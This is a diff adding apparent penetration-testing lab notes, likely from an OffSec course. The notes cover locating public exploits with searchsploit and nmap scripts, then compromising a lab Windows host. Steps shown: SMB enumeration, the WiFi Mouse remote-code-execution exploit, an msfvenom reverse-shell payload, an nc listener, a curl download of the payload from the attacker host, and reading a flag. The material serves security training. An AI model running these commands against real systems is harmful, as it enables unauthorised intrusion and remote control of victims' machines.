@@ -1,0 +1,89 @@
+Locating public exploits
+
+exploitdb
+
+searchsploit php, webdav, windows
+
+searchsploit -m 50944
+
+python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp
+
+https://www.exploit-db.com/exploits/50944
+
+------------
+grep exploits /usr/share/nmap/scripts/*.nse
+
+nmap --script-help=clamav-exec.nse
+
+------------
+Exploiting a target
+
+attacker 192.168.49.53
+
+target 192.168.53.10
+
+sudo nmap -Pn -sC -sV -p- 192.168.53.10
+
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows 10 Pro 15063 microsoft-ds (workgroup: WORKGROUP)
+
+smbclient -L //192.168.53.10
+
+Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        offsec          Disk      
+        Users           Disk 
+
+smbclient //192.168.53.10/offsec
+
+cd downloads
+ls
+
+  .                                  DR        0  Thu Jun 23 07:03:57 2022
+  ..                                 DR        0  Thu Jun 23 07:03:57 2022
+  7z2200-x64.exe                      A  1569243  Tue Jun 21 21:56:35 2022
+  ccsetup601.exe                      A 49618184  Tue Jun 21 21:54:25 2022
+  ChromeSetup.exe                     A  1414600  Tue Jun 21 21:53:48 2022
+  desktop.ini                       AHS      282  Tue Jun 21 01:07:23 2022
+  Firefox Installer.exe               A   348616  Tue Jun 21 21:52:08 2022
+  MouseServer.exe                     A  3150224  Tue Jun 21 21:55:48 2022
+  ZoomBackground.png                  A  4269990  Thu Jun 23 07:03:57 2022
+
+MouseServer.exe
+
+https://www.exploit-db.com/
+
+searchsploit MouseServer
+
+https://www.exploit-db.com/exploits/49601
+WiFi Mouse 1.7.8.5 - Remote Code Execution
+EDB-ID: 49601
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.53 LPORT=4444 -f exe > reverse.exe
+
+nc -nvlp 4444
+
+python3 -m http.server 80
+
+searchsploit -m 49601
+
+python2 49601.py 192.168.53.10 192.168.49.53 reverse.exe
+
+test:
+curl http://192.168.49.53/reverse.exe --output reverse.exe
+
+C:\Windows\system32
+
+type \users\offsec\desktop\flag.txt
+
+OS{02466d369778a6764d4df9d16be70ca2}
+
+
+
+
+
+
